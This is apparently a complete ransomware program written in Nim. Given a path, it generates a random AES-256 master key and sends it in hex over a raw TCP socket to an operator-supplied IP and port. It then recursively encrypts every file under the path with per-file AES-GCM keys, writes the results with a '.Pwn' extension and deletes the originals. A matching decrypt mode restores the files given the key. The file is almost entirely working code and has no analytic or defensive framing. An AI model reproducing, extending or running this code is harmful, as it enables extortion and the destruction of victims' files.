#[
per file:
key = aes(master, sha(filename & filesize))

different key per file using their initial filename and filesize
]#

import std/[os, net, strformat, strutils, sha1, sysrand]
import nimcrypto

const
  AES_256_KEY_SIZE = 32
  AES_BLOCK_SIZE = 16
  EXT = "Pwn"

proc decrypt(ctx: var GCM[aes256], fn: string) =
  var
    output = changeFileExt(fn, "")
    ct = cast[seq[byte]](readFile(fn))
    pt = newSeq[byte](len(ct))
  ctx.decrypt(ct, pt)
  writeFile(output, pt)
  removeFile(fn)

proc encrypt(ctx: var GCM[aes256], fn: string) =
  var
    output = fmt"{fn}.{EXT}"
    pt = cast[seq[byte]](readFile(fn))
    ct = newSeq[byte](len(pt))
  ctx.encrypt(pt, ct)
  writeFile(output, ct)
  removeFile(fn)

proc genKey(master: seq[byte], filename: string, filesize: BiggestInt): seq[byte] =
  var fn = filename
  if filename.endsWith(EXT):
    fn.removeSuffix(fmt".{EXT}")
  var
    ctx: GCM[aes256]
    nonce = cast[seq[byte]]($secureHash(fn & $filesize))[0..AES_BLOCK_SIZE]
    key = newSeq[byte](AES_256_KEY_SIZE)
  ctx.init(master, [], [])
  ctx.encrypt(nonce, key)
  return key

proc walk(path: string, master: seq[byte], act: proc(c: var GCM[aes256], x: string)) =
  var ctx: GCM[aes256]
  if(fileExists(path)):
    let key = genKey(master, path, getFileSize(path))
    ctx.init(key, [], [])
    act(ctx, path)
    return
  for entry in walkDirRec(path):
    if entry.fileExists:
      let key = genKey(master, entry, getFileSize(entry))
      ctx.init(key, [], [])
      act(ctx, entry)

proc sendKeyIv(host: (string, Port), key: seq[byte]) =
  var server = newSocket()
  connect(server, host[0], host[1])
  send(server, toHex(key) & "\n")
  close(server)

proc main() =
  if(paramCount() < 3):
    stdout.write dedent fmt"""
    usage:
      {paramStr(0)} e [path] [ip] [port]
      {paramStr(0)} d [path] [key]
    """
    quit 0

  case paramStr(1)[0]:
    of 'e':
      let
        path = paramStr(2)
        ip = paramStr(3)
        port = Port parseUInt paramStr(4)
        master = urandom(AES_256_KEY_SIZE)
      sendKeyIv((ip, port), master)
      walk(path, master, encrypt)
    of 'd':
      let
        path = paramStr(2)
        master = cast[seq[byte]](parseHexStr paramStr(3))
      walk(path, master, decrypt)
    else:
      stderr.write "neither e(ncrypt) or d(ecrypt): aborting\n"
      quit 1

main()
